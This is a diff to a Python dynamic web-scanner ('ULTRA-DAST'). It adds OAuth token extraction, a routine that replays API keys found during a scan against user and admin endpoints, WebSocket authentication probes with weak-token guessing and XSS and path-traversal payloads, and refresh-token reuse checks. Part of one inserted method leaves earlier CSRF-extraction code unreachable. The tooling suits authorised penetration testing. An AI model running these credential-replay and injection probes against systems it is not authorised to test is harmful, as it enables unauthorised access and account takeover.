@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-ULTRA-DAST v18.5 – The Unstoppable Pentester Platform
+ULTRA-DAST v18.6 – The Unstoppable Pentester Platform
 Full implementation with async engine, advanced evasion, second-order injection,
 race conditions, request smuggling, WebSocket/gRPC fuzzing, CVSS 4.0, Burp XML,
 JIRA/Slack alerts, multi‑tab GUI, proxy mode, FP learning, and more.
@@ -5127,6 +5127,7 @@ class AdvancedProxyTab(QWidget):
 
 import aiohttp
 from aiohttp import FormData
+from typing import List, Dict, Any
 from bs4 import BeautifulSoup
 import bs4
 import json
@@ -13873,6 +13874,94 @@ class SessionStateManager:
                     await self.set_csrf_token(session_id, form_url, field_name, meta_tag['content'])
                     logging.info(f"Extracted CSRF token {field_name} from meta tag at {form_url}")
             
+        except Exception as e:
+            logging.warning(f"Error extracting CSRF tokens from HTML: {e}")
+
+    async def extract_csrf_tokens_from_oauth_response(self, session_id: str, oauth_url: str, response_text: str, response_headers: dict = None):
+        """Extract CSRF/state tokens from OAuth authorization responses and store them in the session."""
+        try:
+            import re
+            import json
+            
+            # OAuth-specific CSRF/state token patterns
+            oauth_token_patterns = [
+                # State parameter in URLs
+                r'state=([a-zA-Z0-9\-_]{16,})',
+                # State in JSON responses
+                r'"state"\s*:\s*"([a-zA-Z0-9\-_]{16,})"',
+                # CSRF tokens in OAuth forms
+                r'csrf[_-]?token["\']?\s*[:=]\s*["\']?([a-zA-Z0-9\-_]{20,})["\']?',
+                # Anti-forgery tokens
+                r'anti[_-]?forgery[_-]?token["\']?\s*[:=]\s*["\']?([a-zA-Z0-9\-_]{20,})["\']?',
+                # OAuth code (sometimes used as CSRF protection)
+                r'code=([a-zA-Z0-9\-_]{20,})',
+            ]
+            
+            tokens_found = {}
+            
+            # Extract tokens from response text
+            for pattern in oauth_token_patterns:
+                matches = re.findall(pattern, response_text, re.IGNORECASE)
+                for match in matches:
+                    if len(match) > 0:
+                        token_value = match if isinstance(match, str) else match[0] if isinstance(match, tuple) else str(match)
+                        if len(token_value) >= 16:  # Only extract reasonably long tokens
+                            # Determine token type based on pattern
+                            if 'state' in pattern.lower():
+                                token_name = 'oauth_state'
+                            elif 'csrf' in pattern.lower():
+                                token_name = 'oauth_csrf_token'
+                            elif 'code' in pattern.lower():
+                                token_name = 'oauth_code'
+                            else:
+                                token_name = 'oauth_token'
+                            
+                            # Store the token
+                            await self.set_csrf_token(session_id, oauth_url, token_name, token_value)
+                            tokens_found[token_name] = token_value
+                            logging.info(f"Extracted OAuth token {token_name} from {oauth_url}")
+            
+            # Extract tokens from JSON responses
+            try:
+                if response_text.strip().startswith('{'):
+                    json_data = json.loads(response_text)
+                    if 'state' in json_data:
+                        await self.set_csrf_token(session_id, oauth_url, 'oauth_state', json_data['state'])
+                        tokens_found['oauth_state'] = json_data['state']
+                        logging.info(f"Extracted OAuth state from JSON response at {oauth_url}")
+                    if 'csrf_token' in json_data:
+                        await self.set_csrf_token(session_id, oauth_url, 'oauth_csrf_token', json_data['csrf_token'])
+                        tokens_found['oauth_csrf_token'] = json_data['csrf_token']
+                        logging.info(f"Extracted OAuth CSRF token from JSON response at {oauth_url}")
+            except json.JSONDecodeError:
+                pass
+            
+            # Extract tokens from headers (Set-Cookie, etc.)
+            if response_headers:
+                # Check for state or CSRF tokens in cookies
+                cookies = response_headers.get('Set-Cookie', '')
+                if cookies:
+                    cookie_patterns = [
+                        r'state=([a-zA-Z0-9\-_]{16,})',
+                        r'csrf[_-]?token=([a-zA-Z0-9\-_]{16,})',
+                        r'oauth[_-]?state=([a-zA-Z0-9\-_]{16,})'
+                    ]
+                    for pattern in cookie_patterns:
+                        matches = re.findall(pattern, cookies, re.IGNORECASE)
+                        for match in matches:
+                            token_value = match if isinstance(match, str) else match[0] if isinstance(match, tuple) else str(match)
+                            if len(token_value) >= 16:
+                                token_name = 'oauth_cookie_state' if 'state' in pattern.lower() else 'oauth_cookie_csrf'
+                                await self.set_csrf_token(session_id, oauth_url, token_name, token_value)
+                                tokens_found[token_name] = token_value
+                                logging.info(f"Extracted OAuth token {token_name} from cookies at {oauth_url}")
+            
+            return tokens_found
+            
+        except Exception as e:
+            logging.warning(f"Error extracting CSRF tokens from OAuth response: {e}")
+            return {}
+            
             # Enhanced CSRF extraction for modern SPAs - JavaScript pattern matching
             js_token_pattern = r'(?:window\.csrf|let\s+token|const\s+csrf)\s*=\s*["\']([^"\']+)["\']'
             matches = re.findall(js_token_pattern, html)
@@ -14646,6 +14735,289 @@ class SecretScanner:
                 logging.warning(f"Error scanning for {secret_type}: {e}")
         
         return secrets_found
+    
+    async def test_api_key_authentication(self, session, base_url, api_keys: List[Dict[str, str]]) -> List[Dict[str, Any]]:
+        """
+        Test discovered API keys by attempting to use them in authenticated requests.
+        
+        Args:
+            session: aiohttp session for making requests
+            base_url: Base URL to test against
+            api_keys: List of discovered API keys with metadata
+        
+        Returns:
+            List of API key test results with security findings
+        """
+        test_results = []
+        
+        if not api_keys:
+            return test_results
+        
+        logging.info(f"[API KEY AUTH] Testing {len(api_keys)} discovered API keys against {base_url}")
+        
+        # Common API key header names and parameter names
+        api_key_headers = [
+            'Authorization', 'X-API-Key', 'x-api-key', 'X-Api-Key', 'api-key',
+            'X-API-KEY', 'API-Key', 'apikey', 'X-Apikey', 'api_key',
+            'X-API-SECRET', 'api-secret', 'X-Auth-Token', 'auth-token',
+            'X-Access-Token', 'access-token', 'X-Session-Token', 'session-token'
+        ]
+        
+        api_key_params = [
+            'api_key', 'apikey', 'key', 'token', 'access_token',
+            'auth_token', 'session_token', 'secret', 'api_secret'
+        ]
+        
+        # Test endpoints that might require authentication
+        test_endpoints = [
+            '/api/user', '/api/users', '/api/account', '/api/me',
+            '/api/profile', '/user', '/account', '/me', '/profile',
+            '/api/admin', '/admin', '/api/config', '/config'
+        ]
+        
+        for api_key_info in api_keys:
+            secret_value = api_key_info.get('raw_value', '')
+            secret_type = api_key_info.get('secret_type', 'Unknown')
+            
+            if not secret_value or len(secret_value) < 10:
+                continue
+            
+            logging.info(f"[API KEY AUTH] Testing {secret_type}: {self._mask_secret(secret_value)}")
+            
+            # Test 1: Try API key in various headers
+            for header_name in api_key_headers:
+                try:
+                    # Format the header value based on the header type
+                    if header_name.lower() == 'authorization':
+                        # Try different auth formats
+                        auth_formats = [
+                            f'Bearer {secret_value}',
+                            f'Basic {secret_value}',
+                            f'ApiKey {secret_value}',
+                            f'Token {secret_value}',
+                            secret_value  # Just the key itself
+                        ]
+                        
+                        for auth_format in auth_formats:
+                            headers = {header_name: auth_format}
+                            
+                            for endpoint in test_endpoints:
+                                test_url = f"{base_url}{endpoint}"
+                                
+                                try:
+                                    async with session.get(test_url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as resp:
+                                        if resp.status == 200:
+                                            test_results.append({
+                                                'secret_type': secret_type,
+                                                'secret_value': self._mask_secret(secret_value),
+                                                'test_type': 'header_authentication',
+                                                'header_name': header_name,
+                                                'auth_format': auth_format[:20] + '...' if len(auth_format) > 20 else auth_format,
+                                                'endpoint': endpoint,
+                                                'status_code': resp.status,
+                                                'success': True,
+                                                'severity': 'Critical',
+                                                'evidence': f'API key works in {header_name} header with format {auth_format[:30]}',
+                                                'url': test_url
+                                            })
+                                            logging.warning(f"[API KEY AUTH] VULNERABLE: API key works in {header_name} header")
+                                            break  # Stop testing other endpoints for this header
+                                        elif resp.status == 403 or resp.status == 401:
+                                            # Key is recognized but access denied - still indicates valid auth mechanism
+                                            test_results.append({
+                                                'secret_type': secret_type,
+                                                'secret_value': self._mask_secret(secret_value),
+                                                'test_type': 'header_authentication',
+                                                'header_name': header_name,
+                                                'auth_format': auth_format[:20] + '...' if len(auth_format) > 20 else auth_format,
+                                                'endpoint': endpoint,
+                                                'status_code': resp.status,
+                                                'success': False,
+                                                'severity': 'Medium',
+                                                'evidence': f'API key recognized but access denied (status {resp.status})',
+                                                'url': test_url
+                                            })
+                                            logging.info(f"[API KEY AUTH] API key recognized but denied access: {header_name}")
+                                            break
+                                except Exception as e:
+                                    logging.debug(f"[API KEY AUTH] Request failed for {header_name}: {e}")
+                                    continue
+                            
+                            # If we found a working format, stop testing other formats
+                            if any(result['success'] for result in test_results if result['header_name'] == header_name):
+                                break
+                    
+                    else:
+                        # For non-authorization headers, use the key directly
+                        headers = {header_name: secret_value}
+                        
+                        for endpoint in test_endpoints:
+                            test_url = f"{base_url}{endpoint}"
+                            
+                            try:
+                                async with session.get(test_url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as resp:
+                                    if resp.status == 200:
+                                        test_results.append({
+                                            'secret_type': secret_type,
+                                            'secret_value': self._mask_secret(secret_value),
+                                            'test_type': 'header_authentication',
+                                            'header_name': header_name,
+                                            'endpoint': endpoint,
+                                            'status_code': resp.status,
+                                            'success': True,
+                                            'severity': 'Critical',
+                                            'evidence': f'API key works in {header_name} header',
+                                            'url': test_url
+                                        })
+                                        logging.warning(f"[API KEY AUTH] VULNERABLE: API key works in {header_name} header")
+                                        break
+                                    elif resp.status == 403 or resp.status == 401:
+                                        test_results.append({
+                                            'secret_type': secret_type,
+                                            'secret_value': self._mask_secret(secret_value),
+                                            'test_type': 'header_authentication',
+                                            'header_name': header_name,
+                                            'endpoint': endpoint,
+                                            'status_code': resp.status,
+                                            'success': False,
+                                            'severity': 'Medium',
+                                            'evidence': f'API key recognized but access denied (status {resp.status})',
+                                            'url': test_url
+                                        })
+                                        logging.info(f"[API KEY AUTH] API key recognized but denied access: {header_name}")
+                                        break
+                            except Exception as e:
+                                logging.debug(f"[API KEY AUTH] Request failed for {header_name}: {e}")
+                                continue
+                    
+                    # If we found success with this header, stop testing other headers
+                    if any(result['success'] for result in test_results if result['header_name'] == header_name):
+                        break
+                        
+                except Exception as e:
+                    logging.debug(f"[API KEY AUTH] Header test failed for {header_name}: {e}")
+                    continue
+            
+            # Test 2: Try API key in query parameters
+            for param_name in api_key_params:
+                try:
+                    for endpoint in test_endpoints:
+                        test_url = f"{base_url}{endpoint}"
+                        params = {param_name: secret_value}
+                        
+                        try:
+                            async with session.get(test_url, params=params, timeout=aiohttp.ClientTimeout(total=10)) as resp:
+                                if resp.status == 200:
+                                    test_results.append({
+                                        'secret_type': secret_type,
+                                        'secret_value': self._mask_secret(secret_value),
+                                        'test_type': 'parameter_authentication',
+                                        'parameter_name': param_name,
+                                        'endpoint': endpoint,
+                                        'status_code': resp.status,
+                                        'success': True,
+                                        'severity': 'Critical',
+                                        'evidence': f'API key works in {param_name} query parameter',
+                                        'url': f"{test_url}?{param_name}=***"
+                                    })
+                                    logging.warning(f"[API KEY AUTH] VULNERABLE: API key works in {param_name} parameter")
+                                    break
+                                elif resp.status == 403 or resp.status == 401:
+                                    test_results.append({
+                                        'secret_type': secret_type,
+                                        'secret_value': self._mask_secret(secret_value),
+                                        'test_type': 'parameter_authentication',
+                                        'parameter_name': param_name,
+                                        'endpoint': endpoint,
+                                        'status_code': resp.status,
+                                        'success': False,
+                                        'severity': 'Medium',
+                                        'evidence': f'API key recognized but access denied (status {resp.status})',
+                                        'url': f"{test_url}?{param_name}=***"
+                                    })
+                                    logging.info(f"[API KEY AUTH] API key recognized but denied access: {param_name}")
+                                    break
+                        except Exception as e:
+                            logging.debug(f"[API KEY AUTH] Parameter test failed for {param_name}: {e}")
+                            continue
+                    
+                    # If we found success with this parameter, stop testing other parameters
+                    if any(result['success'] for result in test_results if result.get('parameter_name') == param_name):
+                        break
+                        
+                except Exception as e:
+                    logging.debug(f"[API KEY AUTH] Parameter test failed for {param_name}: {e}")
+                    continue
+            
+            # Test 3: Check for privilege escalation (admin access)
+            if any(result['success'] for result in test_results):
+                try:
+                    admin_endpoints = ['/api/admin', '/admin', '/api/users', '/api/config']
+                    
+                    for result in test_results:
+                        if not result['success']:
+                            continue
+                        
+                        # Use the successful authentication method
+                        if result['test_type'] == 'header_authentication':
+                            headers = {result['header_name']: secret_value}
+                            if result['header_name'].lower() == 'authorization':
+                                headers[result['header_name']] = result.get('auth_format', f'Bearer {secret_value}')
+                            
+                            for admin_endpoint in admin_endpoints:
+                                admin_url = f"{base_url}{admin_endpoint}"
+                                
+                                try:
+                                    async with session.get(admin_url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as resp:
+                                        if resp.status == 200:
+                                            test_results.append({
+                                                'secret_type': secret_type,
+                                                'secret_value': self._mask_secret(secret_value),
+                                                'test_type': 'privilege_escalation',
+                                                'admin_endpoint': admin_endpoint,
+                                                'status_code': resp.status,
+                                                'success': True,
+                                                'severity': 'Critical',
+                                                'evidence': f'API key has admin access to {admin_endpoint}',
+                                                'url': admin_url
+                                            })
+                                            logging.warning(f"[API KEY AUTH] CRITICAL: API key has admin access to {admin_endpoint}")
+                                            break
+                                except Exception as e:
+                                    logging.debug(f"[API KEY AUTH] Admin access test failed: {e}")
+                                    continue
+                        
+                        elif result['test_type'] == 'parameter_authentication':
+                            params = {result['parameter_name']: secret_value}
+                            
+                            for admin_endpoint in admin_endpoints:
+                                admin_url = f"{base_url}{admin_endpoint}"
+                                
+                                try:
+                                    async with session.get(admin_url, params=params, timeout=aiohttp.ClientTimeout(total=10)) as resp:
+                                        if resp.status == 200:
+                                            test_results.append({
+                                                'secret_type': secret_type,
+                                                'secret_value': self._mask_secret(secret_value),
+                                                'test_type': 'privilege_escalation',
+                                                'admin_endpoint': admin_endpoint,
+                                                'status_code': resp.status,
+                                                'success': True,
+                                                'severity': 'Critical',
+                                                'evidence': f'API key has admin access to {admin_endpoint}',
+                                                'url': f"{admin_url}?{result['parameter_name']}=***"
+                                            })
+                                            logging.warning(f"[API KEY AUTH] CRITICAL: API key has admin access to {admin_endpoint}")
+                                            break
+                                except Exception as e:
+                                    logging.debug(f"[API KEY AUTH] Admin access test failed: {e}")
+                                    continue
+                
+                except Exception as e:
+                    logging.debug(f"[API KEY AUTH] Privilege escalation test failed: {e}")
+        
+        logging.info(f"[API KEY AUTH] API key authentication testing completed. Found {len(test_results)} results.")
+        return test_results
     
     def _mask_secret(self, secret: str, max_chars: int = 8) -> str:
         """Mask secret value for safe logging."""
@@ -16760,6 +17132,231 @@ class JSRenderDriver:
         
         logging.warning(f"No WebSocket message found matching pattern: {pattern}")
         return None
+    
+    def test_websocket_authentication(self, ws_url, auth_methods=None):
+        """Test WebSocket authentication mechanisms"""
+        if not WEBSOCKETS_AVAILABLE:
+            logging.warning("WebSocket library not available for authentication testing")
+            return None
+        
+        try:
+            import websockets
+            import asyncio
+            import json
+            
+            auth_methods = auth_methods or {
+                'no_auth': False,
+                'bearer_token': None,
+                'api_key': None,
+                'basic_auth': None,
+                'custom_headers': {}
+            }
+            
+            results = {
+                'url': ws_url,
+                'auth_tests': [],
+                'vulnerabilities': []
+            }
+            
+            # Test 1: Connection without authentication
+            try:
+                logging.info(f"[WS AUTH] Testing connection without authentication to {ws_url}")
+                
+                async def test_no_auth():
+                    try:
+                        async with websockets.connect(ws_url, timeout=5) as websocket:
+                            # Send a test message
+                            await websocket.send(json.dumps({"test": "auth_check"}))
+                            response = await websocket.recv()
+                            
+                            results['auth_tests'].append({
+                                'method': 'no_auth',
+                                'success': True,
+                                'response': response[:200] if response else None,
+                                'vulnerability': 'WebSocket accepts unauthenticated connections'
+                            })
+                            
+                            if 'unauthorized' not in response.lower() and 'forbidden' not in response.lower():
+                                results['vulnerabilities'].append({
+                                    'type': 'WebSocket Missing Authentication',
+                                    'severity': 'High',
+                                    'evidence': 'WebSocket accepted connection without authentication',
+                                    'url': ws_url
+                                })
+                                logging.warning(f"[WS AUTH] VULNERABLE: WebSocket accepts unauthenticated connections")
+                            
+                            return True
+                    except Exception as e:
+                        results['auth_tests'].append({
+                            'method': 'no_auth',
+                            'success': False,
+                            'error': str(e)
+                        })
+                        return False
+                
+                # Run the async test
+                loop = asyncio.new_event_loop()
+                asyncio.set_event_loop(loop)
+                loop.run_until_complete(test_no_auth())
+                loop.close()
+                
+            except Exception as e:
+                logging.debug(f"[WS AUTH] No auth test failed: {e}")
+            
+            # Test 2: Bearer token authentication
+            if auth_methods.get('bearer_token'):
+                try:
+                    logging.info(f"[WS AUTH] Testing bearer token authentication")
+                    token = auth_methods['bearer_token']
+                    
+                    async def test_bearer_token():
+                        try:
+                            headers = {'Authorization': f'Bearer {token}'}
+                            async with websockets.connect(ws_url, extra_headers=headers, timeout=5) as websocket:
+                                await websocket.send(json.dumps({"test": "auth_check"}))
+                                response = await websocket.recv()
+                                
+                                results['auth_tests'].append({
+                                    'method': 'bearer_token',
+                                    'success': True,
+                                    'response': response[:200] if response else None
+                                })
+                                return True
+                        except Exception as e:
+                            results['auth_tests'].append({
+                                'method': 'bearer_token',
+                                'success': False,
+                                'error': str(e)
+                            })
+                            return False
+                    
+                    loop = asyncio.new_event_loop()
+                    asyncio.set_event_loop(loop)
+                    loop.run_until_complete(test_bearer_token())
+                    loop.close()
+                    
+                except Exception as e:
+                    logging.debug(f"[WS AUTH] Bearer token test failed: {e}")
+            
+            # Test 3: API key authentication
+            if auth_methods.get('api_key'):
+                try:
+                    logging.info(f"[WS AUTH] Testing API key authentication")
+                    api_key = auth_methods['api_key']
+                    
+                    async def test_api_key():
+                        try:
+                            headers = {'X-API-Key': api_key}
+                            async with websockets.connect(ws_url, extra_headers=headers, timeout=5) as websocket:
+                                await websocket.send(json.dumps({"test": "auth_check"}))
+                                response = await websocket.recv()
+                                
+                                results['auth_tests'].append({
+                                    'method': 'api_key',
+                                    'success': True,
+                                    'response': response[:200] if response else None
+                                })
+                                return True
+                        except Exception as e:
+                            results['auth_tests'].append({
+                                'method': 'api_key',
+                                'success': False,
+                                'error': str(e)
+                            })
+                            return False
+                    
+                    loop = asyncio.new_event_loop()
+                    asyncio.set_event_loop(loop)
+                    loop.run_until_complete(test_api_key())
+                    loop.close()
+                    
+                except Exception as e:
+                    logging.debug(f"[WS AUTH] API key test failed: {e}")
+            
+            # Test 4: Weak authentication testing
+            try:
+                logging.info(f"[WS AUTH] Testing weak authentication tokens")
+                
+                weak_tokens = [
+                    '12345', 'admin', 'password', 'token', 'test',
+                    'secret', 'key', 'auth', 'default', 'guest'
+                ]
+                
+                async def test_weak_token(token):
+                    try:
+                        headers = {'Authorization': f'Bearer {token}'}
+                        async with websockets.connect(ws_url, extra_headers=headers, timeout=3) as websocket:
+                            await websocket.send(json.dumps({"test": "auth_check"}))
+                            response = await websocket.recv()
+                            
+                            if 'unauthorized' not in response.lower() and 'forbidden' not in response.lower():
+                                results['vulnerabilities'].append({
+                                    'type': 'WebSocket Weak Authentication',
+                                    'severity': 'Critical',
+                                    'evidence': f'Weak token "{token}" accepted by WebSocket',
+                                    'url': ws_url,
+                                    'weak_token': token
+                                })
+                                logging.warning(f"[WS AUTH] VULNERABLE: Weak token '{token}' accepted")
+                                return True
+                    except:
+                        return False
+                
+                for weak_token in weak_tokens:
+                    loop = asyncio.new_event_loop()
+                    asyncio.set_event_loop(loop)
+                    loop.run_until_complete(test_weak_token(weak_token))
+                    loop.close()
+                    
+            except Exception as e:
+                logging.debug(f"[WS AUTH] Weak auth test failed: {e}")
+            
+            # Test 5: Message injection without authentication
+            try:
+                logging.info(f"[WS AUTH] Testing message injection without authentication")
+                
+                injection_payloads = [
+                    '{"command": "admin", "action": "get_users"}',
+                    '{"action": "delete", "id": "1"}',
+                    '{"admin": true, "command": "execute"}',
+                    '<script>alert(1)</script>',
+                    '../../etc/passwd'
+                ]
+                
+                async def test_injection(payload):
+                    try:
+                        async with websockets.connect(ws_url, timeout=3) as websocket:
+                            await websocket.send(payload)
+                            response = await websocket.recv()
+                            
+                            if 'error' not in response.lower() and 'unauthorized' not in response.lower():
+                                results['vulnerabilities'].append({
+                                    'type': 'WebSocket Injection Without Authentication',
+                                    'severity': 'High',
+                                    'evidence': f'Injection payload accepted without auth: {payload[:50]}',
+                                    'url': ws_url,
+                                    'payload': payload[:100]
+                                })
+                                logging.warning(f"[WS AUTH] VULNERABLE: Injection payload accepted without auth")
+                                return True
+                    except:
+                        return False
+                
+                for payload in injection_payloads:
+                    loop = asyncio.new_event_loop()
+                    asyncio.set_event_loop(loop)
+                    loop.run_until_complete(test_injection(payload))
+                    loop.close()
+                    
+            except Exception as e:
+                logging.debug(f"[WS AUTH] Injection test failed: {e}")
+            
+            logging.info(f"[WS AUTH] WebSocket authentication testing completed for {ws_url}")
+            return results
+            
+        except Exception as e:
+            logging.warning(f"WebSocket authentication testing error: {e}")
+            return None
 
 class BusinessLogicFSM:
     """
@@ -30624,6 +31221,7 @@ class InjectionEngine:
             await self._test_oauth_state_parameter(oauth_url)  # This function creates its own sessions for CSRF testing
             await self._test_oauth_redirect_manipulation(oauth_url, session_manager, session_id)
             await self._test_oauth_pkce_flow(oauth_url, session_manager, session_id)
+            await self._test_oauth_bearer_token_refresh(oauth_url, session_manager, session_id)  # New refresh token testing
             
             # Use BrowserAuthHelper for complex OAuth flows if available
             if hasattr(self, 'browser_auth_helper') and self.config.get('enable_browser_oauth_auth', False):
@@ -30780,6 +31378,12 @@ class InjectionEngine:
                 resp = await self._async_fetch(auth_url, method='GET', params=base_params,
                                              cookies=session_cookies, headers=session_headers)
                 session_manager.update_session_from_response(session_id, resp)
+                
+                # Extract CSRF tokens from OAuth response
+                if resp and resp._body:
+                    await session_manager.extract_csrf_tokens_from_oauth_response(
+                        session_id, auth_url, resp._body, dict(resp.headers) if resp.headers else None
+                    )
             else:
                 resp = await self._async_fetch(auth_url, method='GET', params=base_params)
             
@@ -30809,6 +31413,12 @@ class InjectionEngine:
                 resp = await self._async_fetch(auth_url, method='GET', params=insecure_params,
                                              cookies=session_cookies, headers=session_headers)
                 session_manager.update_session_from_response(session_id, resp)
+                
+                # Extract CSRF tokens from OAuth response
+                if resp and resp._body:
+                    await session_manager.extract_csrf_tokens_from_oauth_response(
+                        session_id, auth_url, resp._body, dict(resp.headers) if resp.headers else None
+                    )
             else:
                 resp = await self._async_fetch(auth_url, method='GET', params=insecure_params)
             
@@ -30934,6 +31544,12 @@ class InjectionEngine:
                                             cookies=session_cookies_1, headers=session_headers_1)
             session_manager.update_session_from_response(session_id_1, resp_1)
             
+            # Extract CSRF tokens from OAuth response
+            if resp_1 and resp_1._body:
+                await session_manager.extract_csrf_tokens_from_oauth_response(
+                    session_id_1, auth_url, resp_1._body, dict(resp_1.headers) if resp_1.headers else None
+                )
+            
             # Step 2: Generate second OAuth login request with state_2
             session_id_2 = session_manager.create_session()
             state_2 = f"state_{uuid.uuid4().hex[:16]}"
@@ -30953,6 +31569,12 @@ class InjectionEngine:
                                             cookies=session_cookies_2, headers=session_headers_2)
             session_manager.update_session_from_response(session_id_2, resp_2)
             
+            # Extract CSRF tokens from OAuth response
+            if resp_2 and resp_2._body:
+                await session_manager.extract_csrf_tokens_from_oauth_response(
+                    session_id_2, auth_url, resp_2._body, dict(resp_2.headers) if resp_2.headers else None
+                )
+            
             # Step 3: CSRF PoC - Swap state parameters between sessions
             logging.info(f"[OAUTH STATE] Step 3: Attempting CSRF by swapping state parameters")
             
@@ -30969,6 +31591,12 @@ class InjectionEngine:
             resp_csrf_1 = await self._async_fetch(auth_url, method='GET', params=params_csrf_1,
                                                  cookies=session_cookies_1_updated, headers=session_headers_1_updated)
             
+            # Extract CSRF tokens from CSRF attempt response
+            if resp_csrf_1 and resp_csrf_1._body:
+                await session_manager.extract_csrf_tokens_from_oauth_response(
+                    session_id_1, auth_url, resp_csrf_1._body, dict(resp_csrf_1.headers) if resp_csrf_1.headers else None
+                )
+            
             # Use state_1 with session_2's context
             params_csrf_2 = {
                 'response_type': 'code',
@@ -30981,6 +31609,12 @@ class InjectionEngine:
             session_headers_2_updated = session_manager.get_session_headers(session_id_2)
             resp_csrf_2 = await self._async_fetch(auth_url, method='GET', params=params_csrf_2,
                                                  cookies=session_cookies_2_updated, headers=session_headers_2_updated)
+            
+            # Extract CSRF tokens from CSRF attempt response
+            if resp_csrf_2 and resp_csrf_2._body:
+                await session_manager.extract_csrf_tokens_from_oauth_response(
+                    session_id_2, auth_url, resp_csrf_2._body, dict(resp_csrf_2.headers) if resp_csrf_2.headers else None
+                )
             
             # Analyze results
             csrf_vulnerable = False
@@ -31155,6 +31789,167 @@ class InjectionEngine:
             
         except Exception as e:
             logging.warning(f"OAuth PKCE flow test error: {e}")
+    
+    async def _test_oauth_bearer_token_refresh(self, token_url, session_manager: SessionStateManager = None, session_id: str = None):
+        """Test OAuth bearer token refresh functionality and security."""
+        try:
+            logging.info(f"[OAUTH REFRESH] Testing bearer token refresh at {token_url} with session {session_id}")
+            
+            # Test 1: Check if refresh token endpoint exists and is accessible
+            refresh_endpoint = token_url.replace('/token', '/refresh') if '/token' in token_url else f"{token_url}/refresh"
+            
+            # Try to discover refresh endpoint from well-known config if available
+            if hasattr(self, 'discovered_oauth_endpoints'):
+                for endpoint in self.discovered_oauth_endpoints:
+                    if 'refresh' in endpoint.lower():
+                        refresh_endpoint = endpoint
+                        break
+            
+            # Test 2: Attempt refresh without proper refresh token (should fail)
+            refresh_data_invalid = {
+                'grant_type': 'refresh_token',
+                'refresh_token': 'invalid_token_12345',
+                'client_id': 'test_client'
+            }
+            
+            if session_manager and session_id:
+                session_cookies = session_manager.get_session_cookies(session_id)
+                session_headers = session_manager.get_session_headers(session_id)
+                resp_invalid = await self._async_fetch(refresh_endpoint, method='POST', data=refresh_data_invalid,
+                                                      cookies=session_cookies, headers=session_headers)
+            else:
+                resp_invalid = await self._async_fetch(refresh_endpoint, method='POST', data=refresh_data_invalid)
+            
+            # Test 3: Check for refresh token rotation vulnerabilities
+            # Some implementations don't rotate refresh tokens, which is a security issue
+            refresh_data_test = {
+                'grant_type': 'refresh_token',
+                'refresh_token': 'test_refresh_token_for_rotation_check',
+                'client_id': 'test_client',
+                'client_secret': 'test_secret'
+            }
+            
+            if session_manager and session_id:
+                session_cookies = session_manager.get_session_cookies(session_id)
+                session_headers = session_manager.get_session_headers(session_id)
+                resp_rotation = await self._async_fetch(refresh_endpoint, method='POST', data=refresh_data_test,
+                                                     cookies=session_cookies, headers=session_headers)
+                
+                # Extract and store any tokens from response
+                if resp_rotation and resp_rotation._body:
+                    await session_manager.extract_csrf_tokens_from_oauth_response(
+                        session_id, refresh_endpoint, resp_rotation._body, dict(resp_rotation.headers) if resp_rotation.headers else None
+                    )
+            else:
+                resp_rotation = await self._async_fetch(refresh_endpoint, method='POST', data=refresh_data_test)
+            
+            # Test 4: Check for refresh token reuse vulnerability
+            # If the same refresh token can be used multiple times, it's vulnerable
+            if resp_rotation and resp_rotation.status == 200:
+                try:
+                    import json
+                    response_data = json.loads(resp_rotation._body)
+                    
+                    # Check if new refresh token was issued (proper rotation)
+                    if 'refresh_token' in response_data:
+                        new_refresh_token = response_data['refresh_token']
+                        
+                        # Try to use the old refresh token again
+                        reuse_data = {
+                            'grant_type': 'refresh_token',
+                            'refresh_token': 'test_refresh_token_for_rotation_check',  # Old token
+                            'client_id': 'test_client'
+                        }
+                        
+                        if session_manager and session_id:
+                            session_cookies = session_manager.get_session_cookies(session_id)
+                            session_headers = session_manager.get_session_headers(session_id)
+                            resp_reuse = await self._async_fetch(refresh_endpoint, method='POST', data=reuse_data,
+                                                              cookies=session_cookies, headers=session_headers)
+                        else:
+                            resp_reuse = await self._async_fetch(refresh_endpoint, method='POST', data=reuse_data)
+                        
+                        # If old token still works, refresh token rotation is not implemented
+                        if resp_reuse and resp_reuse.status == 200:
+                            await self._add_vulnerability({
+                                "type": "OAuth Refresh Token Reuse Vulnerability",
+                                "url": refresh_endpoint,
+                                "parameter": "refresh_token",
+                                "evidence": "Refresh token can be reused multiple times without rotation",
+                                "severity": "High",
+                                "confidence": 85,
+                                "cwe": "CWE-287",  # Improper Authentication
+                                "oauth_test_results": {
+                                    "test_type": "refresh_token_rotation",
+                                    "token_rotation_missing": True,
+                                    "reuse_successful": True
+                                }
+                            })
+                        else:
+                            logging.info(f"[OAUTH REFRESH] Refresh token rotation appears functional - old token rejected")
+                    else:
+                        await self._add_vulnerability({
+                            "type": "OAuth Refresh Token Not Rotated",
+                            "url": refresh_endpoint,
+                            "parameter": "refresh_token",
+                            "evidence": "New refresh token not issued during token refresh",
+                            "severity": "Medium",
+                            "confidence": 75,
+                            "cwe": "CWE-287",
+                            "oauth_test_results": {
+                                "test_type": "refresh_token_rotation",
+                                "new_refresh_token_missing": True
+                            }
+                        })
+                        
+                except json.JSONDecodeError:
+                    logging.debug(f"[OAUTH REFRESH] Could not parse refresh response as JSON")
+            
+            # Test 5: Check for missing refresh token expiration
+            # Try to extract token expiration information
+            if resp_rotation and resp_rotation._body:
+                try:
+                    import json
+                    response_data = json.loads(resp_rotation._body)
+                    
+                    if 'expires_in' not in response_data and 'expires' not in response_data:
+                        await self._add_vulnerability({
+                            "type": "OAuth Token Expiration Missing",
+                            "url": refresh_endpoint,
+                            "parameter": "expires_in",
+                            "evidence": "Token response missing expiration information",
+                            "severity": "Medium",
+                            "confidence": 65,
+                            "cwe": "CWE-613",  # Insufficient Session Expiration
+                            "oauth_test_results": {
+                                "test_type": "token_expiration",
+                                "expiration_missing": True
+                            }
+                        })
+                        
+                except json.JSONDecodeError:
+                    pass
+            
+            # Test 6: Check for refresh token exposure in URL
+            if '?' in refresh_endpoint and 'refresh_token' in refresh_endpoint:
+                await self._add_vulnerability({
+                    "type": "OAuth Refresh Token in URL",
+                    "url": refresh_endpoint,
+                    "parameter": "refresh_token",
+                    "evidence": "Refresh token exposed in URL query parameter",
+                    "severity": "High",
+                    "confidence": 90,
+                    "cwe": "CWE-598",  # Use of GET Request for Sensitive Information
+                    "oauth_test_results": {
+                        "test_type": "token_exposure",
+                        "token_in_url": True
+                    }
+                })
+            
